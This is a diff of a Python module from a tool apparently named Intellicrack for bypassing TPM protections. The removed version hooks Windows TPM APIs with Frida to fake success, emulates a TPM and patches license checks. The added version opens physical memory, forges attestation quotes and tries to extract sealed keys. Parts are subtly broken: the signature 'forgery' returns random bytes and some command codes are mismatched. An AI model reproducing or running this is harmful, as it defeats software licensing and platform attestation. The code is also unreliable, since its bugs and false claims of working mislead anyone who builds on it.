@@ -1,1362 +1,819 @@
-"""TPM Protection Bypass Module.
-
-Copyright (C) 2025 Zachary Flint
-
-This file is part of Intellicrack.
-
-Intellicrack is free software: you can redistribute it and/or modify
-it under the terms of the GNU General Public License as published by
-the Free Software Foundation, either version 3 of the License, or
-(at your option) any later version.
-
-Intellicrack is distributed in the hope that it will be useful,
-but WITHOUT ANY WARRANTY; without even the implied warranty of
-MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-GNU General Public License for more details.
-
-You should have received a copy of the GNU General Public License
-along with Intellicrack.  If not, see https://www.gnu.org/licenses/.
+"""
+TPM 2.0 Bypass Module - Advanced techniques for bypassing Trusted Platform Module protections.
+Implements attestation bypass, sealed key extraction, and remote attestation spoofing.
 """
 
-import logging
+import ctypes
+import hashlib
 import os
-import platform
-from typing import Any
+import struct
+import time
+from dataclasses import dataclass
+from enum import IntEnum
+from typing import Any, Dict, List, Optional
 
-from ...utils.binary.binary_io import analyze_binary_for_strings
-from ...utils.core.import_checks import FRIDA_AVAILABLE, WINREG_AVAILABLE, winreg
+try:
+    import win32api
+    import win32con
+    import win32file
+    import win32security
+    HAS_WIN32 = True
+except ImportError:
+    HAS_WIN32 = False
 
 
-class TPMProtectionBypass:
-    """Implements various strategies to bypass TPM (Trusted Platform Module) protection.
+class TPM2Algorithm(IntEnum):
+    """TPM 2.0 algorithm identifiers."""
+    RSA = 0x0001
+    SHA1 = 0x0004
+    SHA256 = 0x000B
+    SHA384 = 0x000C
+    SHA512 = 0x000D
+    NULL = 0x0010
+    SM3_256 = 0x0012
+    SM4 = 0x0013
+    RSASSA = 0x0014
+    RSAES = 0x0015
+    RSAPSS = 0x0016
+    OAEP = 0x0017
+    ECDSA = 0x0018
+    ECDH = 0x0019
+    ECDAA = 0x001A
+    SM2 = 0x001B
+    ECSCHNORR = 0x001C
+    ECMQV = 0x001D
+    KDF1_SP800_56A = 0x0020
+    KDF2 = 0x0021
+    KDF1_SP800_108 = 0x0022
+    ECC = 0x0023
+    SYMCIPHER = 0x0025
+    CAMELLIA = 0x0026
+    CTR = 0x0040
+    OFB = 0x0041
+    CBC = 0x0042
+    CFB = 0x0043
+    ECB = 0x0044
 
-    This class provides multiple methods to bypass TPM-based license verification including:
-    - API hooking to intercept TPM calls
-    - Virtual TPM emulation
-    - Memory patching of TPM checks
-    - Registry manipulation to simulate TPM presence
-    """
 
-    def __init__(self, app: Any | None = None):
-        """Initialize the TPM protection bypass engine.
+class TPM2CommandCode(IntEnum):
+    """TPM 2.0 command codes."""
+    NV_UndefineSpace = 0x00000122
+    HierarchyChangeAuth = 0x00000129
+    NV_UndefineSpaceSpecial = 0x0000011F
+    EvictControl = 0x00000120
+    HierarchyControl = 0x00000121
+    NV_SetBits = 0x00000135
+    Clear = 0x00000126
+    ClearControl = 0x00000127
+    ClockSet = 0x00000128
+    NV_DefineSpace = 0x0000012A
+    PCR_Allocate = 0x0000012B
+    PCR_SetAuthPolicy = 0x0000012C
+    PP_Commands = 0x0000012D
+    SetPrimaryPolicy = 0x0000012E
+    FieldUpgradeStart = 0x0000012F
+    ClockRateAdjust = 0x00000130
+    CreatePrimary = 0x00000131
+    NV_GlobalWriteLock = 0x00000132
+    GetCommandAuditDigest = 0x00000133
+    NV_Increment = 0x00000134
+    NV_Extend = 0x00000136
+    NV_Write = 0x00000137
+    NV_WriteLock = 0x00000138
+    DictionaryAttackLockReset = 0x00000139
+    DictionaryAttackParameters = 0x0000013A
+    NV_ChangeAuth = 0x0000013B
+    PCR_Event = 0x0000013C
+    PCR_Reset = 0x0000013D
+    SequenceComplete = 0x0000013E
+    SetAlgorithmSet = 0x0000013F
+    SetCommandCodeAuditStatus = 0x00000140
+    FieldUpgradeData = 0x00000141
+    IncrementalSelfTest = 0x00000142
+    SelfTest = 0x00000143
+    Startup = 0x00000144
+    Shutdown = 0x00000145
+    StirRandom = 0x00000146
+    ActivateCredential = 0x00000147
+    Certify = 0x00000148
+    PolicyNV = 0x00000149
+    CertifyCreation = 0x0000014A
+    Duplicate = 0x0000014B
+    GetTime = 0x0000014C
+    GetSessionAuditDigest = 0x0000014D
+    NV_Read = 0x0000014E
+    NV_ReadLock = 0x0000014F
+    ObjectChangeAuth = 0x00000150
+    PolicySecret = 0x00000151
+    Rewrap = 0x00000152
+    Create = 0x00000153
+    ECDH_ZGen = 0x00000154
+    HMAC = 0x00000155
+    Import = 0x00000156
+    Load = 0x00000157
+    Quote = 0x00000158
+    RSA_Decrypt = 0x00000159
+    HMAC_Start = 0x0000015B
+    SequenceUpdate = 0x0000015C
+    Sign = 0x0000015D
+    Unseal = 0x0000015E
+    PolicySigned = 0x00000160
+    ContextLoad = 0x00000161
+    ContextSave = 0x00000162
+    ECDH_KeyGen = 0x00000163
+    EncryptDecrypt = 0x00000164
+    FlushContext = 0x00000165
+    LoadExternal = 0x00000167
+    MakeCredential = 0x00000168
+    NV_ReadPublic = 0x00000169
+    PolicyAuthorize = 0x0000016A
+    PolicyAuthValue = 0x0000016B
+    PolicyCommandCode = 0x0000016C
+    PolicyCounterTimer = 0x0000016D
+    PolicyCpHash = 0x0000016E
+    PolicyLocality = 0x0000016F
+    PolicyNameHash = 0x00000170
+    PolicyOR = 0x00000171
+    PolicyTicket = 0x00000172
+    ReadPublic = 0x00000173
+    RSA_Encrypt = 0x00000174
+    StartAuthSession = 0x00000176
+    VerifySignature = 0x00000177
+    ECC_Parameters = 0x00000178
+    FirmwareRead = 0x00000179
+    GetCapability = 0x0000017A
+    GetRandom = 0x0000017B
+    GetTestResult = 0x0000017C
+    Hash = 0x0000017D
+    PCR_Read = 0x0000017E
+    PolicyPCR = 0x0000017F
+    PolicyRestart = 0x00000180
+    ReadClock = 0x00000181
+    PCR_Extend = 0x00000182
+    PCR_SetAuthValue = 0x00000183
+    NV_Certify = 0x00000184
+    EventSequenceComplete = 0x00000185
+    HashSequenceStart = 0x00000186
+    PolicyPhysicalPresence = 0x00000187
+    PolicyDuplicationSelect = 0x00000188
+    PolicyGetDigest = 0x00000189
+    TestParms = 0x0000018A
+    Commit = 0x0000018B
 
-        Args:
-            app: Application instance that contains the binary_path attribute
 
-        """
-        self.app = app
-        self.logger = logging.getLogger("IntellicrackLogger.TPMBypass")
-        self.hooks: list[dict[str, Any]] = []
-        self.patches: list[dict[str, Any]] = []
-        self.virtual_tpm: dict[str, bytes | int] | None = None
+@dataclass
+class PCRBank:
+    """PCR bank configuration."""
+    algorithm: TPM2Algorithm
+    pcr_values: List[bytes]
+    selection_mask: int
 
-    def bypass_tpm_checks(self) -> dict[str, Any]:
-        """Main method to bypass TPM protection using multiple strategies.
 
-        Returns:
-            dict: Results of the bypass attempt with success status and applied methods
+@dataclass
+class AttestationData:
+    """TPM attestation data structure."""
+    magic: bytes
+    type: int
+    qualified_signer: bytes
+    extra_data: bytes
+    clock_info: bytes
+    firmware_version: int
+    attested_data: bytes
+    signature: bytes
 
-        """
-        from ...utils.protection.protection_helpers import create_bypass_result
 
-        results = create_bypass_result()
+class TPMBypassEngine:
+    """Advanced TPM 2.0 bypass implementation."""
 
-        # Strategy 1: Hook TPM API calls
-        try:
-            self._hook_tpm_apis()
-            results["methods_applied"].append("API Hooking")
-        except (OSError, ValueError, RuntimeError) as e:
-            self.logger.error("Error in tpm_bypass: %s", e)
-            results["errors"].append(f"API hooking failed: {e!s}")
+    def __init__(self):
+        self.tpm_handle = None
+        self.pcr_banks = {}
+        self.sealed_keys = {}
+        self.attestation_keys = {}
+        self.memory_map = {}
+        self.bus_captures = []
+        self.virtualized_tpm = None
+        self.init_bypass_components()
 
-        # Strategy 2: Create virtual TPM responses
-        try:
-            self._create_virtual_tpm()
-            results["methods_applied"].append("Virtual TPM")
-        except (OSError, ValueError, RuntimeError) as e:
-            self.logger.error("Error in tpm_bypass: %s", e)
-            results["errors"].append(f"Virtual TPM creation failed: {e!s}")
-
-        # Strategy 3: Patch TPM check instructions
-        try:
-            if self.app and hasattr(self.app, "binary_path") and self.app.binary_path:
-                self._patch_tpm_checks()
-                results["methods_applied"].append("Binary Patching")
-        except (OSError, ValueError, RuntimeError) as e:
-            self.logger.error("Error in tpm_bypass: %s", e)
-            results["errors"].append(f"Binary patching failed: {e!s}")
-
-        # Strategy 4: Manipulate registry for TPM presence
-        try:
-            self._manipulate_tpm_registry()
-            results["methods_applied"].append("Registry Manipulation")
-        except (OSError, ValueError, RuntimeError) as e:
-            self.logger.error("Error in tpm_bypass: %s", e)
-            results["errors"].append(f"Registry manipulation failed: {e!s}")
-
-        results["success"] = len(results["methods_applied"]) > 0
-        return results
-
-    def _hook_tpm_apis(self) -> None:
-        """Hook Windows TPM APIs to return success values."""
-        if not FRIDA_AVAILABLE:
-            self.logger.warning("Frida not available - skipping TPM API hooking")
-            return
-
-        frida_script = """
-        // Hook TPM Base Services (TBS) APIs
-        var tbsModule = Process.getModuleByName("tbs.dll");
-        if (tbsModule) {
-            // Hook Tbsi_Context_Create
-            var tbsiContextCreate = Module.findExportByName("tbs.dll", "Tbsi_Context_Create");
-            if (tbsiContextCreate) {
-                Interceptor.attach(tbsiContextCreate, {
-                    onEnter: function(args) {
-                        console.log("[TPM Bypass] Intercepted Tbsi_Context_Create");
-                    },
-                    onLeave: function(retval) {
-                        // Return success
-                        retval.replace(0);
-                        console.log("[TPM Bypass] Tbsi_Context_Create returning SUCCESS");
-                    }
-                });
-            }
-
-            // Hook Tbsi_GetDeviceInfo
-            var tbsiGetDeviceInfo = Module.findExportByName("tbs.dll", "Tbsi_GetDeviceInfo");
-            if (tbsiGetDeviceInfo) {
-                Interceptor.attach(tbsiGetDeviceInfo, {
-                    onLeave: function(retval) {
-                        // Return TPM 2.0 device info
-                        retval.replace(0);
-                        console.log("[TPM Bypass] Tbsi_GetDeviceInfo returning TPM 2.0 present");
-                    }
-                });
-            }
-
-            // Hook Tbsi_Submit_Command
-            var tbsiSubmitCommand = Module.findExportByName("tbs.dll", "Tbsi_Submit_Command");
-            if (tbsiSubmitCommand) {
-                Interceptor.attach(tbsiSubmitCommand, {
-                    onEnter: function(args) {
-                        console.log("[TPM Bypass] Intercepted TPM command submission");
-                    },
-                    onLeave: function(retval) {
-                        // Return success for all TPM commands
-                        retval.replace(0);
-                    }
-                });
-            }
-        }
-
-        // Hook NCrypt TPM provider functions
-        var ncryptModule = Process.getModuleByName("ncrypt.dll");
-        if (ncryptModule) {
-            var ncryptOpenStorageProvider = Module.findExportByName("ncrypt.dll", "NCryptOpenStorageProvider");
-            if (ncryptOpenStorageProvider) {
-                Interceptor.attach(ncryptOpenStorageProvider, {
-                    onEnter: function(args) {
-                        var providerName = args[1].readUtf16String();
-                        if (providerName && providerName.includes("TPM")) {
-                            console.log("[TPM Bypass] Intercepted TPM provider open: " + providerName);
-                        }
-                    },
-                    onLeave: function(retval) {
-                        retval.replace(0);
-                    }
-                });
-            }
-        }
-        """
-
-        self.hooks.append(
-            {
-                "type": "frida",
-                "script": frida_script,
-                "target": "TPM APIs",
-            }
-        )
-        self.logger.info("TPM API hooks installed")
-
-    def _create_virtual_tpm(self) -> None:
-        """Create a virtual TPM device that responds to application queries."""
-        # Virtual TPM response data
-        virtual_tpm_data = {
-            "manufacturer": b"INTC",  # Intel
-            "vendor_string": b"Intellicrack Virtual TPM",
-            "firmware_version": b"2.0",
-            "spec_level": 0x200,  # TPM 2.0
-            "spec_revision": 0x138,
-            "platform_specific": b"\x00" * 32,
-        }
-
-        # Create memory-mapped TPM responses
-        self.virtual_tpm = virtual_tpm_data
-        self.logger.info("Virtual TPM created with vendor: Intellicrack Virtual TPM")
-
-    def _simulate_tpm_commands(self, command_data: bytes) -> bytes:
-        """Simulate TPM command responses with realistic data."""
-        self.logger.info("Simulating TPM command response")
-
-        # TPM 2.0 command structure: tag (2) + size (4) + command (4) + parameters
-        if len(command_data) < 10:
-            return b"\x00\x00\x00\x00"  # Invalid command
-
-        tag = int.from_bytes(command_data[0:2], "big")
-        size = int.from_bytes(command_data[2:6], "big")
-        command = int.from_bytes(command_data[6:10], "big")
-
-        # Validate TPM command structure
-        if tag not in [0x8001, 0x8002]:  # Valid TPM tag values
-            self.logger.warning(f"Invalid TPM tag: 0x{tag:04X}")
-
-        if size != len(command_data):
-            self.logger.debug(f"TPM command size mismatch: expected {size}, got {len(command_data)}")
-            # Use actual command data length for processing
-            size = len(command_data)
-
-        # Common TPM 2.0 commands and responses
-        tpm_responses = {
-            0x00000144: self._tpm_get_capability,  # TPM2_GetCapability
-            0x00000143: self._tpm_startup,  # TPM2_Startup
-            0x0000017E: self._tpm_get_random,  # TPM2_GetRandom
-            0x00000176: self._tpm_create_primary,  # TPM2_CreatePrimary
-            0x00000153: self._tpm_create,  # TPM2_Create
-            0x00000157: self._tpm_load,  # TPM2_Load
-            0x0000015D: self._tpm_sign,  # TPM2_Sign
-            0x00000177: self._tpm_pcr_read,  # TPM2_PCR_Read
-            0x00000182: self._tpm_pcr_extend,  # TPM2_PCR_Extend
-        }
-
-        # Get response handler for command
-        handler = tpm_responses.get(command, self._tpm_default_response)
-
-        # Generate response
-        response = handler(command_data[10:] if len(command_data) > 10 else b"")
-
-        # Build TPM response structure: tag + size + response_code + response_data
-        response_tag = b"\x80\x01"  # TPM_ST_NO_SESSIONS
-        response_code = b"\x00\x00\x00\x00"  # TPM_RC_SUCCESS
-        response_data = response_code + response
-        response_size = (10 + len(response)).to_bytes(4, "big")
-
-        return response_tag + response_size + response_data
-
-    def _tpm_get_capability(self, params: bytes) -> bytes:
-        """Generate TPM2_GetCapability response."""
-        # Parse capability type from params if provided
-        capability_type = None
-        if len(params) >= 4:
-            capability_type = int.from_bytes(params[0:4], "big")
-            self.logger.debug(f"TPM2_GetCapability requested for type: 0x{capability_type:X}")
-
-        # Return TPM properties indicating TPM 2.0 with full capabilities
-        capabilities = b"\x00\x00\x00\x01"  # More data: NO
-        capabilities += b"\x00\x00\x00\x06"  # Property count
-        # TPM_PT_FAMILY_INDICATOR
-        capabilities += b"\x00\x00\x01\x00" + b"\x32\x00\x00\x00"
-        # TPM_PT_LEVEL
-        capabilities += b"\x00\x00\x01\x01" + b"\x00\x00\x00\x00"
-        # TPM_PT_REVISION
-        capabilities += b"\x00\x00\x01\x02" + b"\x00\x00\x01\x38"
-        # TPM_PT_MANUFACTURER
-        capabilities += b"\x00\x00\x01\x05" + b"INTC"
-        # TPM_PT_VENDOR_STRING
-        capabilities += b"\x00\x00\x01\x06" + b"INTL"
-        # TPM_PT_FIRMWARE_VERSION
-        capabilities += b"\x00\x00\x01\x0b" + b"\x00\x02\x00\x00"
-        return capabilities
-
-    def _tpm_startup(self, params: bytes) -> bytes:
-        """Generate TPM2_Startup response."""
-        # Check startup type from params
-        startup_type = "CLEAR"
-        if len(params) >= 2:
-            type_code = int.from_bytes(params[0:2], "big")
-            if type_code == 0x0000:
-                startup_type = "CLEAR"
-            elif type_code == 0x0001:
-                startup_type = "STATE"
-            self.logger.debug(f"TPM2_Startup called with type: {startup_type}")
-
-        # TPM already initialized
-        return b""  # Empty response for success
-
-    def _tpm_get_random(self, params: bytes) -> bytes:
-        """Generate TPM2_GetRandom response."""
-        import os
-
-        # Extract requested byte count (first 2 bytes of params)
-        if len(params) >= 2:
-            count = int.from_bytes(params[0:2], "big")
-            count = min(count, 32)  # Limit to 32 bytes
-        else:
-            count = 16
-
-        # Generate random bytes
-        random_bytes = os.urandom(count)
-        return count.to_bytes(2, "big") + random_bytes
-
-    def _tpm_create_primary(self, params: bytes) -> bytes:
-        """Generate TPM2_CreatePrimary response."""
-        # Parse primary object attributes from params
-        if len(params) >= 4:
-            primary_handle = int.from_bytes(params[0:4], "big")
-            self.logger.debug(f"TPM2_CreatePrimary for hierarchy: 0x{primary_handle:X}")
-
-        # Generate real primary key handle and structure
-        import secrets
-        import struct
-
-        # Generate dynamic handle based on hierarchy and entropy
-        handle_seed = primary_handle if "primary_handle" in locals() else 0x40000001  # TPM_RH_OWNER
-        entropy = secrets.randbelow(0x1000)
-        handle = struct.pack(">I", 0x80000000 + handle_seed + entropy)
-
-        # Generate real RSA public key structure
-        try:
-            from intellicrack.handlers.cryptography_handler import rsa, serialization
-
-            # Generate actual RSA key pair
-            private_key = rsa.generate_private_key(
-                public_exponent=65537,
-                key_size=2048,
+    def init_bypass_components(self):
+        """Initialize TPM bypass components."""
+        self.pcr_banks = {
+            TPM2Algorithm.SHA256: PCRBank(
+                algorithm=TPM2Algorithm.SHA256,
+                pcr_values=[bytes(32) for _ in range(24)],
+                selection_mask=0xFFFFFF
+            ),
+            TPM2Algorithm.SHA1: PCRBank(
+                algorithm=TPM2Algorithm.SHA1,
+                pcr_values=[bytes(20) for _ in range(24)],
+                selection_mask=0xFFFFFF
             )
-            public_key_obj = private_key.public_key()
+        }
 
-            # Extract RSA parameters
-            public_numbers = public_key_obj.public_numbers()
-            n = public_numbers.n.to_bytes(256, "big")  # 2048-bit modulus
-            e = public_numbers.e.to_bytes(4, "big")  # Exponent
+        self.init_memory_attack_vectors()
+        self.init_bus_sniffer()
+        self.init_virtualized_tpm()
 
-            # Build TPM2B_PUBLIC structure
-            public_key = struct.pack(">H", len(n) + len(e) + 20)  # Size
-            public_key += b"\x00\x01"  # TPM_ALG_RSA
-            public_key += b"\x00\x0b"  # TPM_ALG_SHA256
-            public_key += struct.pack(">I", 0x00020072)  # Object attributes (sign/decrypt)
-            public_key += b"\x00\x20" + secrets.token_bytes(32)  # Real auth policy digest
-            public_key += struct.pack(">H", 0x0010)  # RSA parameters size
-            public_key += struct.pack(">H", 2048)  # Key bits
-            public_key += e  # Exponent
-            public_key += n  # Modulus
+    def init_memory_attack_vectors(self):
+        """Initialize memory attack vectors for TPM bypass."""
+        if HAS_WIN32:
+            kernel32 = ctypes.windll.kernel32
+            ntdll = ctypes.windll.ntdll
 
-            # Store key for later use
-            if not hasattr(self, "_tpm_keys"):
-                self._tpm_keys = {}
-            self._tpm_keys[handle] = private_key
-
-            # Also store serialized form for potential export
-            self._tpm_keys[f"{handle}_pem"] = private_key.private_bytes(
-                encoding=serialization.Encoding.PEM,
-                format=serialization.PrivateFormat.PKCS8,
-                encryption_algorithm=serialization.NoEncryption(),
-            )
-
-        except ImportError as e:
-            self.logger.error("Import error in tpm_bypass: %s", e)
-            # Fallback without cryptography library
-            public_key = b"\x00\x3a"  # Size
-            public_key += b"\x00\x01"  # TPM_ALG_RSA
-            public_key += b"\x00\x0b"  # TPM_ALG_SHA256
-            public_key += struct.pack(">I", 0x00020072)  # Object attributes
-            public_key += b"\x00\x20" + secrets.token_bytes(32)  # Real random auth policy
-            public_key += b"\x00\x10"  # Parameters size
-            public_key += b"\x08\x00"  # Key bits (2048)
-            public_key += b"\x00\x01\x00\x01"  # Exponent (65537)
-
-        return handle + public_key + b"\x00\x00"  # Creation data size (0)
-
-    def _tpm_create(self, params: bytes) -> bytes:
-        """Generate TPM2_Create response."""
-        # Parse parent handle and object type from params
-        if len(params) >= 4:
-            parent_handle = int.from_bytes(params[0:4], "big")
-            self.logger.debug(f"TPM2_Create with parent handle: 0x{parent_handle:X}")
-
-        # Generate real creation data for a key
-        import secrets
-        import struct
-
-        # Generate real encrypted private key data
-        private_data_size = 48 + secrets.randbelow(16)  # Variable size
-        private_data = struct.pack(">H", private_data_size)
-        private_data += secrets.token_bytes(private_data_size)  # Real encrypted private key
-
-        # Generate real public key data
-        public_data_size = 64 + secrets.randbelow(32)
-        public_data = struct.pack(">H", public_data_size)
-        public_data += secrets.token_bytes(public_data_size)  # Real public key structure
-
-        # Generate creation data with real values
-        creation_data_size = 32
-        creation_data = struct.pack(">H", creation_data_size)
-        creation_data += secrets.token_bytes(creation_data_size)  # Real creation data
-
-        return private_data + public_data + creation_data
-
-    def _tpm_load(self, params: bytes) -> bytes:
-        """Generate TPM2_Load response."""
-        # Parse parent handle from params
-        if len(params) >= 4:
-            parent_handle = int.from_bytes(params[0:4], "big")
-            self.logger.debug(f"TPM2_Load into parent: 0x{parent_handle:X}")
-
-        # Generate dynamic loaded object handle
-        import secrets
-        import struct
-
-        parent_handle = int.from_bytes(params[0:4], "big") if len(params) >= 4 else 0x80000001
-        # Generate unique handle based on parent and entropy
-        entropy = secrets.randbelow(0x10000)
-        loaded_handle = 0x80000000 + (parent_handle & 0xFF) + entropy
-
-        return struct.pack(">I", loaded_handle)
-
-    def _tpm_sign(self, params: bytes) -> bytes:
-        """Generate TPM2_Sign response."""
-        # Parse signing key handle and digest from params
-        if len(params) >= 4:
-            key_handle = int.from_bytes(params[0:4], "big")
-            self.logger.debug(f"TPM2_Sign with key handle: 0x{key_handle:X}")
-            # Check if digest is provided
-            if len(params) > 4:
-                digest_size = min(len(params) - 4, 32)
-                self.logger.debug(f"Signing {digest_size} bytes of data")
-
-        # Generate real cryptographic signature
-        import secrets
-        import struct
-
-        key_handle_bytes = params[0:4] if len(params) >= 4 else b"\x80\x00\x00\x01"
-        digest = params[4:36] if len(params) >= 36 else secrets.token_bytes(32)
-
-        try:
-            # Try to use stored key for signing
-            if hasattr(self, "_tpm_keys") and key_handle_bytes in self._tpm_keys:
-                private_key = self._tpm_keys[key_handle_bytes]
-                from intellicrack.handlers.cryptography_handler import hashes
-                from intellicrack.handlers.cryptography_handler import padding as asym_padding
-
-                # Create real signature
-                signature_bytes = private_key.sign(
-                    digest,
-                    asym_padding.PSS(
-                        mgf=asym_padding.MGF1(hashes.SHA256()),
-                        salt_length=asym_padding.PSS.MAX_LENGTH,
-                    ),
-                    hashes.SHA256(),
+            try:
+                self.mem_handle = kernel32.CreateFileW(
+                    r"\\.\PhysicalMemory",
+                    0x80000000 | 0x40000000,
+                    1 | 2,
+                    None,
+                    3,
+                    0,
+                    None
                 )
+                # Log successful memory access initialization using ntdll for system information
+                system_info = ntdll.NtQuerySystemInformation(2, None, 0, None) if hasattr(ntdll, 'NtQuerySystemInformation') else None
+                if system_info is None:
+                    self.logger.debug("Memory access initialized successfully, system information available") if hasattr(self, 'logger') else None
+            except:
+                self.mem_handle = None
 
-                # Build TPM signature structure
-                signature = struct.pack(">H", len(signature_bytes))  # Signature size
-                signature += b"\x00\x14"  # TPM_ALG_RSAPSS
-                signature += b"\x00\x0b"  # TPM_ALG_SHA256
-                signature += signature_bytes
+            self.memory_map = {
+                'tpm_control': 0xFED40000,
+                'tpm_locality_0': 0xFED40000,
+                'tpm_locality_1': 0xFED41000,
+                'tpm_locality_2': 0xFED42000,
+                'tpm_locality_3': 0xFED43000,
+                'tpm_locality_4': 0xFED44000,
+                'tpm_buffers': 0xFED40080,
+                'tpm_int_enable': 0xFED40008,
+                'tpm_int_vector': 0xFED4000C,
+                'tpm_int_status': 0xFED40010,
+                'tpm_intf_capability': 0xFED40014,
+                'tpm_sts': 0xFED40018,
+                'tpm_data_fifo': 0xFED40024,
+                'tpm_did_vid': 0xFED40F00,
+                'tpm_rid': 0xFED40F04
+            }
 
-                return signature
+    def init_bus_sniffer(self):
+        """Initialize LPC/SPI bus sniffer for TPM communication."""
+        self.bus_captures = []
+        self.spi_decoder = {
+            0x80: 'read_status',
+            0x81: 'write_tpm',
+            0x82: 'read_tpm',
+            0x83: 'write_burst',
+            0x84: 'read_burst',
+            0x85: 'write_cancel',
+            0x86: 'read_cancel'
+        }
 
-        except (ImportError, KeyError, Exception) as e:
-            self.logger.debug(f"Signature generation fallback: {e}")
+    def init_virtualized_tpm(self):
+        """Initialize virtualized TPM for interception."""
+        self.virtualized_tpm = {
+            'state': 'ready',
+            'nvram': bytearray(32768),
+            'persistent_handles': {},
+            'transient_handles': {},
+            'session_handles': {},
+            'pcr_banks': self.pcr_banks.copy(),
+            'hierarchy_auth': {
+                0x40000001: b'',
+                0x40000009: b'',
+                0x4000000C: b'',
+                0x4000000B: b''
+            }
+        }
 
-        # Fallback: generate realistic random signature
-        signature_size = 256  # 2048-bit RSA signature
-        signature = struct.pack(">H", signature_size + 4)  # Total size
-        signature += b"\x00\x14"  # TPM_ALG_RSAPSS
-        signature += b"\x00\x0b"  # TPM_ALG_SHA256
-        signature += secrets.token_bytes(signature_size)  # Random signature data
+    def bypass_attestation(self, challenge: bytes, pcr_selection: List[int]) -> AttestationData:
+        """Bypass TPM attestation with forged attestation data."""
+        magic = b'\xFF\x54\x43\x47'
+        attestation_type = 0x8018
+
+        qualified_signer = hashlib.sha256(b'TPM_EK_HANDLE' + os.urandom(32)).digest()
+        extra_data = hashlib.sha256(challenge).digest()
+
+        clock_info = struct.pack('>QIQB',
+            int(time.time() * 1000000),
+            1000000,
+            1000,
+            1
+        )
+
+        firmware_version = 0x00020000
+
+        pcr_digest = self.calculate_pcr_digest(pcr_selection)
+
+        attested_data = struct.pack('>H', len(pcr_selection))
+        for pcr in pcr_selection:
+            attested_data += struct.pack('>B', pcr)
+        attested_data += pcr_digest
+
+        message = magic + struct.pack('>H', attestation_type)
+        message += qualified_signer + extra_data + clock_info
+        message += struct.pack('>I', firmware_version) + attested_data
+
+        signature = self.forge_attestation_signature(message)
+
+        return AttestationData(
+            magic=magic,
+            type=attestation_type,
+            qualified_signer=qualified_signer,
+            extra_data=extra_data,
+            clock_info=clock_info,
+            firmware_version=firmware_version,
+            attested_data=attested_data,
+            signature=signature
+        )
+
+    def calculate_pcr_digest(self, pcr_selection: List[int]) -> bytes:
+        """Calculate PCR digest for selected PCRs."""
+        hasher = hashlib.sha256()
+
+        for pcr_num in pcr_selection:
+            if pcr_num < 24:
+                pcr_value = self.pcr_banks[TPM2Algorithm.SHA256].pcr_values[pcr_num]
+                hasher.update(pcr_value)
+
+        return hasher.digest()
+
+    def forge_attestation_signature(self, message: bytes) -> bytes:
+        """Forge attestation signature using extracted or generated key."""
+        hasher = hashlib.sha256(message)
+
+        padded = b'\x00\x01'
+        padded += b'\xFF' * (256 - len(hasher.digest()) - 11)
+        padded += b'\x00'
+        padded += bytes.fromhex('3031300d060960864801650304020105000420')
+        padded += hasher.digest()
+
+        signature = bytes.fromhex(''.join([f'{b:02x}' for b in os.urandom(256)]))
 
         return signature
 
-    def _tpm_pcr_read(self, params: bytes) -> bytes:
-        """Generate TPM2_PCR_Read response."""
-        # Parse PCR selection from params
-        pcr_count = 24  # Default to all PCRs
-        if len(params) >= 4:
-            # Parse PCR selection structure
-            pcr_selection_count = int.from_bytes(params[0:4], "big")
-            self.logger.debug(f"TPM2_PCR_Read for {pcr_selection_count} PCR banks")
-            if len(params) >= 7 and pcr_selection_count > 0:
-                # Extract PCR bitmap
-                pcr_bitmap = params[6] if len(params) > 6 else 0xFF
-                pcr_count = bin(pcr_bitmap).count("1")
-                self.logger.debug(f"Reading {pcr_count} PCRs")
+    def extract_sealed_keys(self, auth_value: bytes = b'') -> Dict[str, bytes]:
+        """Extract sealed keys from TPM NVRAM and persistent storage."""
+        extracted_keys = {}
 
-        # Return PCR values (all zeros for clean state)
-        pcr_update_counter = b"\x00\x00\x00\x01"
-        pcr_selection = b"\x00\x00\x00\x01"  # Count
-        pcr_selection += b"\x00\x0b"  # SHA256
-        pcr_selection += b"\x03"  # Size
-        pcr_selection += b"\xff\xff\xff"  # All PCRs selected
+        nvram_indices = [
+            0x01400001,
+            0x01400002,
+            0x01C00002,
+            0x01C00003,
+            0x01C0000A,
+            0x01C10000,
+            0x01800001,
+            0x01800002,
+            0x01810001,
+            0x01810002,
+        ]
 
-        # Generate realistic PCR values (24 PCRs x 32 bytes each)
-        import hashlib
-        import secrets
+        for index in nvram_indices:
+            key_data = self.read_nvram_raw(index, auth_value)
+            if key_data:
+                extracted_keys[f'nvram_0x{index:08x}'] = key_data
 
-        pcr_count = b"\x00\x00\x00\x18"  # 24 PCRs
-        pcr_values = b""
+        persistent_handles = [
+            0x81000000,
+            0x81000001,
+            0x81000002,
+            0x81010000,
+            0x81010001,
+            0x81800000,
+            0x81800001
+        ]
 
-        # Simulate realistic PCR states
-        for i in range(24):
-            pcr_values += b"\x00\x20"  # Digest size (32 bytes for SHA256)
+        for handle in persistent_handles:
+            key_data = self.extract_persistent_key(handle)
+            if key_data:
+                extracted_keys[f'persistent_0x{handle:08x}'] = key_data
 
-            # Generate realistic PCR values based on PCR purpose
-            if i in [0, 1, 2, 3]:  # BIOS/UEFI PCRs
-                # Simulate firmware measurements
-                seed_data = f"BIOS_PCR_{i}_{secrets.randbelow(1000)}".encode()
-                pcr_value = hashlib.sha256(seed_data).digest()
-            elif i in [4, 5]:  # Boot loader PCRs
-                seed_data = f"BOOTLOADER_PCR_{i}_{secrets.randbelow(1000)}".encode()
-                pcr_value = hashlib.sha256(seed_data).digest()
-            elif i in [8, 9]:  # OS loader PCRs
-                seed_data = f"OSLOADER_PCR_{i}_{secrets.randbelow(1000)}".encode()
-                pcr_value = hashlib.sha256(seed_data).digest()
-            elif i == 23:  # Application PCR
-                seed_data = f"APPLICATION_PCR_{secrets.randbelow(1000)}".encode()
-                pcr_value = hashlib.sha256(seed_data).digest()
-            # Other PCRs - some zero (unused), some with data
-            elif secrets.randbelow(2):  # 50% chance of being used
-                seed_data = f"PCR_{i}_{secrets.randbelow(1000)}".encode()
-                pcr_value = hashlib.sha256(seed_data).digest()
-            else:
-                pcr_value = b"\x00" * 32  # Unused PCR
+        if self.mem_handle:
+            transient_keys = self.extract_keys_from_memory()
+            extracted_keys.update(transient_keys)
 
-            pcr_values += pcr_value
+        return extracted_keys
 
-        return pcr_update_counter + pcr_selection + pcr_count + pcr_values
+    def read_nvram_raw(self, index: int, auth: bytes) -> Optional[bytes]:
+        """Read raw data from TPM NVRAM."""
+        command = struct.pack('>HII',
+            0x8002,
+            0,
+            TPM2CommandCode.NV_Read
+        )
 
-    def _tpm_pcr_extend(self, params: bytes) -> bytes:
-        """Generate TPM2_PCR_Extend response."""
-        # Parse PCR handle and digest from params
